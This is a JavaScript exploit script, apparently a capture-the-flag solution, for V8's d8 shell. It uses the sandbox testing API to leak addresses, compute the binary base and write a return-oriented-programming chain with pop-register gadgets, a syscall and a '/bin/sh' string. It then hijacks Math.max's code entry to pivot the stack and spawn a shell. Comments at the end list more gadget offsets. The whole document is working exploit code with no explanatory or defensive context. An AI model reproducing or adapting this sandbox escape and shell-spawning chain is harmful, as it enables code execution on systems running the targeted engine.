function ftoi(val) {
  var buf = new ArrayBuffer(8);
  var f64_buf = new Float64Array(buf);
  var u64_buf = new Uint32Array(buf);

  f64_buf[0] = val;
  return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

function itof(val) {
  var buf = new ArrayBuffer(8);
  var f64_buf = new Float64Array(buf);
  var u64_buf = new Uint32Array(buf);

  u64_buf[0] = Number(val & 0xffffffffn);
  u64_buf[1] = Number(val >> 32n);
  return f64_buf[0];
}

function itoh(value) {
  return value.toString(16);
}


var sbxMemView = new Sandbox.MemoryView(0, 0xffffffff);
var dv = new DataView(sbxMemView);
var addrOf = (o) => Sandbox.getAddressOf(o);

var readHeap8 = (offset) => dv.getBigUint64(offset, true);
var writeHeap8 = (offset, value) => dv.setBigUint64(offset, value, true);

//%DebugPrint(Math.max);

var leak = ftoi(Sandbox.leakIsolate(0x20a4)) - 1n;

var pie = BigInt(Sandbox.getPIELeak);

var d8_leak = pie | (leak >> 32n);
console.log(`[+] d8_leak = 0x${itoh(d8_leak)}`);

var d8_base = d8_leak - 0xb9e730n
console.log(`[+] d8_base = 0x${itoh(d8_base)}`);

var cleanup_stack_jmp = d8_base + 0x0000000000eea343n; // pop rbx; jmp qword ptr [rsi + 0x66];
console.log(`[+] cleanup_stack_jmp = 0x${itoh(cleanup_stack_jmp)}`);

var stack_pivot = d8_base + 0x000000000100a5ecn; // pop rsp; add rsp, 0x10; pop rbp; ret;
console.log(`[+] stack_pivot = 0x${itoh(stack_pivot)}`);

var cpt_page = ((leak << 32n) & 0xffffffff00000000n) | 0xffe10000n;
console.log(`[+] cpt_page = 0x${itoh(cpt_page)}`);

var pop_rdi = d8_base + 0x000000000121b9ben;
console.log(`[+] pop_rdi = 0x${itoh(pop_rdi)}`);

var pop_rsi = d8_base + 0x0000000000cb6a7en;
console.log(`[+] pop_rsi = 0x${itoh(pop_rsi)}`);

var pop_rdx = d8_base + 0x0000000000df86b2n;
console.log(`[+] pop_rdx = 0x${itoh(pop_rdx)}`);

var syscall = d8_base + 0x00000000013686b2n;
console.log(`[+] syscall = 0x${itoh(syscall)}`);

var bin_sh = itof(0x0068732f6e69622fn);

writeHeap8(addrOf(this) + 0x60 + 0x66 + 0x1, stack_pivot);

writeHeap8(addrOf(Math) + 0x18 + 0x1, pop_rdi);
writeHeap8(addrOf(Math) + 0x18 + 0x1 + 0x8, BigInt(Sandbox.base) | BigInt(addrOf(bin_sh)) + 0x4n);
writeHeap8(addrOf(Math) + 0x18 + 0x1 + 0x10, pop_rsi);
writeHeap8(addrOf(Math) + 0x18 + 0x1 + 0x18, 0x0000000000000000n);
writeHeap8(addrOf(Math) + 0x18 + 0x1 + 0x20, pop_rdx);
writeHeap8(addrOf(Math) + 0x18 + 0x1 + 0x28, 0x0000000000000000n);
writeHeap8(addrOf(Math) + 0x18 + 0x1 + 0x30, syscall);

console.log(`[+] writing to cpt_page+0x10ae0n (Math.max) code entry`)
Sandbox.ArbMemoryWrite(cpt_page+0x10ae0n, cleanup_stack_jmp);
console.log(`[+] Survived Yaaay!`)

//%SystemBreak();

Math.max(1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1);

//
//
//
// 0x000000000132aa30: pop r15; pop rbp; ret;
//
// 0x000000000121b9be: pop rdi; ret;
// 0x0000000000cb6a7e: pop rsi; ret;
//
// 0x0000000000df86b2: pop rdx; ret;
// 0x0000000001222e04: pop rax; ret;
// 0x00000000007bb750: pop r10; pop rbp; ret;
// 0x00000000013686b2: syscall;
//
// 0x0000000000f2923e: pop rbp; jmp qword ptr [rsi + 0xf];
// 0x0000000000e6f09e: pop rdi; jmp qword ptr [rsi + 0xf];
// 0x00000000008a5bd7: pop rsi; jmp qword ptr [rsi + 0xf];
//
//
// 0x00000000013b85f3: pop rbp; jmp qword ptr [rsi + 0x18];
// 0x00000000008b7ba0: pop rbp; jmp qword ptr [rsi + 0x66];
// 0x00000000011d75fe: pop rbx; jmp qword ptr [rsi + 0x41];
// 0x0000000000eea343: pop rbx; jmp qword ptr [rsi + 0x66];
// 0x00000000011d79af: pop rdi; jmp qword ptr [rsi + 0x41];
// 0x00000000009eeaa0: pop rdi; jmp qword ptr [rsi + 0x66];
// 0x0000000000dd5a84: pop rsi; jmp qword ptr [rsi + 0x2e];
// 0x00000000009d21b1: pop rsi; jmp qword ptr [rsi + 0x66];
//
// 0x000000000100a5ec: pop rsp; add rsp, 0x10; pop rbp; ret;
//
